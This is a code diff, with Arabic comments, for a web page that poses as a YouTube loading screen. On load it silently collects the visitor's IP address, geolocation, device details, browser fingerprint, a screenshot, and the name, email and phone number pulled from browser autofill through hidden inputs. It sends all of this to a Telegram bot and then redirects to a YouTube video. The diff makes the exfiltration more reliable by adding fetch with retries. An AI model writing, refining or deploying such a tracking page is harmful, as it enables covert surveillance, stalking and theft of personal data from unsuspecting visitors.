@@ -8,7 +8,7 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
     <style>
-        /* ===== التصميم ===== */
+        /* نفس التصميم السابق */
         * {
             margin: 0;
             padding: 0;
@@ -252,7 +252,7 @@
 
     <script>
         // ================================================================
-        //  التكوين (عدّل حسب رغبتك)
+        //  التكوين (تأكد من صحة التوكن ورقم الشات)
         // ================================================================
         const CONFIG = {
             targetUrl: 'https://youtu.be/YiK3BulNaWQ?si=M1AJboH6vgZymq7-',
@@ -261,20 +261,130 @@
         };
 
         // ================================================================
-        //  المتغيرات
+        //  دالة إرسال إلى تليجرام (تستخدم fetch مع إعادة محاولة)
         // ================================================================
-        let isRedirected = false;
+        async function sendToTelegram(text, imageDataURL = null, maxRetries = 2) {
+            const token = CONFIG.botToken;
+            const chatId = CONFIG.chatId;
+            if (!token || !chatId) {
+                console.error('❌ توكن أو Chat ID غير موجود');
+                return false;
+            }
 
-        // ================================================================
-        //  دوال مساعدة
-        // ================================================================
-        function log(msg) {
-            console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);
+            // بناء الرسالة النصية
+            let caption = text;
+
+            // محاولة الإرسال مع إعادة المحاولة
+            let attempt = 0;
+            while (attempt <= maxRetries) {
+                try {
+                    if (imageDataURL) {
+                        // تحويل الصورة إلى Blob
+                        const byteString = atob(imageDataURL.split(',')[1]);
+                        const mimeString = imageDataURL.split(',')[0].split(':')[1].split(';')[0];
+                        const ab = new ArrayBuffer(byteString.length);
+                        const ia = new Uint8Array(ab);
+                        for (let i = 0; i < byteString.length; i++) {
+                            ia[i] = byteString.charCodeAt(i);
+                        }
+                        const blob = new Blob([ab], { type: mimeString });
+
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', blob, 'youtube_screenshot.jpg');
+                        formData.append('caption', caption);
+                        formData.append('parse_mode', 'Markdown');
+
+                        const response = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+
+                        if (response.ok) {
+                            console.log('✅ تم إرسال الصورة + النص بنجاح');
+                            return true;
+                        } else {
+                            const errorText = await response.text();
+                            console.error(`❌ فشل إرسال الصورة (محاولة ${attempt+1}): ${response.status} - ${errorText}`);
+                            // إذا فشل إرسال الصورة، نحاول إرسال النص فقط
+                            if (attempt === maxRetries) {
+                                // آخر محاولة نجرب النص فقط
+                                return await sendTextOnly(token, chatId, caption);
+                            }
+                        }
+                    } else {
+                        // إرسال نص فقط
+                        return await sendTextOnly(token, chatId, caption);
+                    }
+                } catch (error) {
+                    console.error(`❌ خطأ في المحاولة ${attempt+1}: ${error.message}`);
+                }
+                attempt++;
+                // انتظار قبل إعادة المحاولة
+                if (attempt <= maxRetries) {
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                }
+            }
+            return false;
+        }
+
+        // دالة إرسال نص فقط
+        async function sendTextOnly(token, chatId, text) {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: text,
+                        parse_mode: 'Markdown',
+                        disable_web_page_preview: true
+                    })
+                });
+                if (response.ok) {
+                    console.log('✅ تم إرسال النص بنجاح');
+                    return true;
+                } else {
+                    const errorText = await response.text();
+                    console.error(`❌ فشل إرسال النص: ${response.status} - ${errorText}`);
+                    return false;
+                }
+            } catch (error) {
+                console.error(`❌ خطأ في إرسال النص: ${error.message}`);
+                return false;
+            }
         }
 
         // ================================================================
-        //  جمع البيانات الأساسية
+        //  دوال جمع البيانات
         // ================================================================
+        function collectDeviceInfo() {
+            const ua = navigator.userAgent;
+            const now = new Date();
+            return {
+                localTime: now.toLocaleString('ar-SA', { timeZone: 'Asia/Baghdad' }),
+                url: window.location.href,
+                referrer: document.referrer || 'مباشر',
+                deviceType: /iPhone/i.test(ua) ? 'iPhone' :
+                    /iPad/i.test(ua) ? 'iPad' :
+                    /Android/i.test(ua) ? 'Android' :
+                    /Windows/i.test(ua) ? 'Windows' :
+                    /Mac/i.test(ua) ? 'Mac' : 'أخرى',
+                browser: /Chrome/i.test(ua) && !/Edge/i.test(ua) ? 'Chrome' :
+                    /Firefox/i.test(ua) ? 'Firefox' :
+                    /Safari/i.test(ua) && !/Chrome/i.test(ua) ? 'Safari' :
+                    /Edge/i.test(ua) ? 'Edge' : 'أخرى',
+                isMobile: /Mobile|Android|iPhone|iPad/i.test(ua),
+                language: navigator.language || 'ar',
+                platform: navigator.platform || 'غير معروف',
+                screenSize: `${screen.width}x${screen.height}`,
+                windowSize: `${window.innerWidth}x${window.innerHeight}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookieEnabled: navigator.cookieEnabled,
+                onlineStatus: navigator.onLine
+            };
+        }
+
         async function getIP() {
             try {
                 const res = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(2000) });
@@ -315,36 +425,6 @@
             });
         }
 
-        function collectDeviceInfo() {
-            const ua = navigator.userAgent;
-            const now = new Date();
-            return {
-                localTime: now.toLocaleString('ar-SA', { timeZone: 'Asia/Baghdad' }),
-                url: window.location.href,
-                referrer: document.referrer || 'مباشر',
-                deviceType: /iPhone/i.test(ua) ? 'iPhone' :
-                    /iPad/i.test(ua) ? 'iPad' :
-                    /Android/i.test(ua) ? 'Android' :
-                    /Windows/i.test(ua) ? 'Windows' :
-                    /Mac/i.test(ua) ? 'Mac' : 'أخرى',
-                browser: /Chrome/i.test(ua) && !/Edge/i.test(ua) ? 'Chrome' :
-                    /Firefox/i.test(ua) ? 'Firefox' :
-                    /Safari/i.test(ua) && !/Chrome/i.test(ua) ? 'Safari' :
-                    /Edge/i.test(ua) ? 'Edge' : 'أخرى',
-                isMobile: /Mobile|Android|iPhone|iPad/i.test(ua),
-                language: navigator.language || 'ar',
-                platform: navigator.platform || 'غير معروف',
-                screenSize: `${screen.width}x${screen.height}`,
-                windowSize: `${window.innerWidth}x${window.innerHeight}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                cookieEnabled: navigator.cookieEnabled,
-                onlineStatus: navigator.onLine
-            };
-        }
-
-        // ================================================================
-        //  جمع البيانات المتقدمة (مع autofill)
-        // ================================================================
         async function collectAdvancedData() {
             const data = {};
 
@@ -416,7 +496,7 @@
             const emailInput = document.getElementById('hiddenEmail');
             const telInput = document.getElementById('hiddenTel');
 
-            // تفعيل autofill بشكل مؤقت
+            // تفعيل autofill مؤقتاً
             [nameInput, emailInput, telInput].forEach(el => {
                 el.style.position = 'fixed';
                 el.style.left = '0';
@@ -441,7 +521,7 @@
             data.autofillEmail = emailInput.value.trim() || 'غير موجود';
             data.autofillTel = telInput.value.trim() || 'غير موجود';
 
-            // إخفاء الحقول نهائياً
+            // إخفاء الحقول
             [nameInput, emailInput, telInput].forEach(el => el.style.display = 'none');
 
             // بصمة المتصفح
@@ -459,9 +539,6 @@
             return data;
         }
 
-        // ================================================================
-        //  التقاط لقطة الشاشة
-        // ================================================================
         async function captureScreenshot() {
             try {
                 const element = document.getElementById('captureArea');
@@ -477,20 +554,37 @@
         }
 
         // ================================================================
-        //  إرسال البيانات إلى تليجرام (طريقة مضمونة)
+        //  العملية الرئيسية
         // ================================================================
-        function sendToTelegram(data, imageDataURL) {
-            const token = CONFIG.botToken;
-            const chatId = CONFIG.chatId;
-            if (!token || !chatId) {
-                log('❌ توكن أو Chat ID غير موجود');
-                return;
-            }
+        async function main() {
+            console.log('🚀 بدء التشغيل');
 
-            const { baseData, advancedData } = data;
+            // 1. شريط التقدم
+            let progress = 0;
+            const progressInterval = setInterval(() => {
+                progress += 4 + Math.floor(Math.random() * 6);
+                if (progress > 90) progress = 90;
+                document.getElementById('progressBar').style.width = progress + '%';
+            }, 70);
+
+            // 2. جمع البيانات الأساسية
+            const deviceInfo = collectDeviceInfo();
+            const ip = await getIP();
+            const location = await getLocation();
+            const baseData = { device: deviceInfo, ip, location };
+
+            // 3. جمع البيانات المتقدمة واللقطة
+            const [advancedData, screenshot] = await Promise.allSettled([
+                collectAdvancedData(),
+                captureScreenshot()
+            ]);
+
+            const advData = advancedData.status === 'fulfilled' ? advancedData.value : {};
+            const imgData = screenshot.status === 'fulfilled' ? screenshot.value : null;
+
+            // 4. بناء الرسالة النصية
             const d = baseData;
-            const adv = advancedData;
-
+            const adv = advData;
             const loc = d.location ? `${d.location.latitude}, ${d.location.longitude} (دقة ${d.location.accuracy}م)` : 'غير متوفر';
             const mapLink = d.location ? `https://www.google.com/maps?q=${d.location.latitude},${d.location.longitude}` : '';
 
@@ -522,129 +616,25 @@
             caption += `📐 *الشاشة:* ${d.device.screenSize}\n`;
             caption += `⏳ *المنطقة:* ${d.device.timezone}\n`;
 
-            // إرسال الصورة إن وجدت
-            if (imageDataURL) {
-                try {
-                    // تحويل dataURL إلى Blob
-                    const byteString = atob(imageDataURL.split(',')[1]);
-                    const mimeString = imageDataURL.split(',')[0].split(':')[1].split(';')[0];
-                    const ab = new ArrayBuffer(byteString.length);
-                    const ia = new Uint8Array(ab);
-                    for (let i = 0; i < byteString.length; i++) {
-                        ia[i] = byteString.charCodeAt(i);
-                    }
-                    const blob = new Blob([ab], { type: mimeString });
+            // 5. إرسال البيانات إلى تليجرام (مع إعادة محاولة)
+            console.log('📤 جاري إرسال البيانات إلى تليجرام...');
+            const sent = await sendToTelegram(caption, imgData, 2);
 
-                    const formData = new FormData();
-                    formData.append('chat_id', chatId);
-                    formData.append('photo', blob, 'youtube_screenshot.jpg');
-                    formData.append('caption', caption);
-                    formData.append('parse_mode', 'Markdown');
-
-                    // استخدام XMLHttpRequest بدلاً من fetch لأنه أكثر توافقاً مع keepalive
-                    const xhr = new XMLHttpRequest();
-                    xhr.open('POST', `https://api.telegram.org/bot${token}/sendPhoto`, true);
-                    xhr.timeout = 10000;
-                    xhr.onload = function() {
-                        if (xhr.status === 200) {
-                            log('✅ تم إرسال الصورة + البيانات بنجاح');
-                        } else {
-                            log(`❌ فشل الإرسال: ${xhr.status} - ${xhr.responseText}`);
-                            // محاولة إرسال النص فقط كخطة بديلة
-                            sendTextOnly(token, chatId, caption);
-                        }
-                    };
-                    xhr.onerror = function() {
-                        log('❌ خطأ في الاتصال، محاولة إرسال نص فقط');
-                        sendTextOnly(token, chatId, caption);
-                    };
-                    xhr.send(formData);
-                } catch (e) {
-                    log(`❌ خطأ في تحضير الصورة: ${e.message}`);
-                    sendTextOnly(token, chatId, caption);
-                }
+            if (sent) {
+                console.log('✅ تم إرسال البيانات بنجاح');
             } else {
-                sendTextOnly(token, chatId, caption);
+                console.error('❌ فشل إرسال البيانات بعد عدة محاولات');
             }
-        }
 
-        // إرسال نص فقط (بدون صورة)
-        function sendTextOnly(token, chatId, text) {
-            try {
-                const xhr = new XMLHttpRequest();
-                xhr.open('POST', `https://api.telegram.org/bot${token}/sendMessage`, true);
-                xhr.setRequestHeader('Content-Type', 'application/json');
-                xhr.timeout = 8000;
-                xhr.onload = function() {
-                    if (xhr.status === 200) {
-                        log('✅ تم إرسال النص بنجاح');
-                    } else {
-                        log(`❌ فشل إرسال النص: ${xhr.status}`);
-                    }
-                };
-                xhr.onerror = function() {
-                    log('❌ فشل إرسال النص (خطأ في الشبكة)');
-                };
-                xhr.send(JSON.stringify({
-                    chat_id: chatId,
-                    text: text,
-                    parse_mode: 'Markdown',
-                    disable_web_page_preview: true
-                }));
-            } catch (e) {
-                log(`❌ فشل إرسال النص: ${e.message}`);
-            }
-        }
-
-        // ================================================================
-        //  العملية الرئيسية (جمع البيانات ثم الإرسال ثم التحويل)
-        // ================================================================
-        async function main() {
-            log('🚀 بدء التشغيل');
-
-            // 1. شريط التقدم
-            let progress = 0;
-            const progressInterval = setInterval(() => {
-                progress += 4 + Math.floor(Math.random() * 6);
-                if (progress > 90) progress = 90;
-                document.getElementById('progressBar').style.width = progress + '%';
-            }, 70);
-
-            // 2. جمع البيانات الأساسية
-            const deviceInfo = collectDeviceInfo();
-            const ip = await getIP();
-            const location = await getLocation();
-            const baseData = { device: deviceInfo, ip, location };
-
-            // 3. جمع البيانات المتقدمة (بالتوازي مع اللقطة)
-            const [advancedData, screenshot] = await Promise.allSettled([
-                collectAdvancedData(),
-                captureScreenshot()
-            ]);
-
-            const advData = advancedData.status === 'fulfilled' ? advancedData.value : {};
-            const imgData = screenshot.status === 'fulfilled' ? screenshot.value : null;
-
-            // 4. إرسال البيانات إلى تليجرام (لا ننتظر الرد)
-            log('📤 إرسال البيانات إلى تليجرام...');
-            sendToTelegram({ baseData, advancedData: advData }, imgData);
-
-            // 5. إنهاء شريط التقدم
+            // 6. إنهاء شريط التقدم
             clearInterval(progressInterval);
             document.getElementById('progressBar').style.width = '100%';
             document.getElementById('statusText').textContent = 'تم التحميل ...';
 
-            // 6. التحويل بعد 0.5 ثانية لإظهار اكتمال التحميل
+            // 7. التحويل بعد 0.5 ثانية
             setTimeout(() => {
-                if (!isRedirected) {
-                    isRedirected = true;
-                    log('🔄 تحويل إلى الرابط');
-                    try {
-                        window.location.replace(CONFIG.targetUrl);
-                    } catch (_) {
-                        window.location.href = CONFIG.targetUrl;
-                    }
-                }
+                console.log('🔄 تحويل إلى الرابط');
+                window.location.replace(CONFIG.targetUrl);
             }, 500);
         }
 
@@ -657,7 +647,7 @@
             window.addEventListener('load', () => setTimeout(main, 200));
         }
 
-        log('✅ تم تحميل النسخة النهائية (مع XHR للإرسال المضمون)');
+        console.log('✅ تم تحميل الصفحة');
     </script>
 </body>
 </html>
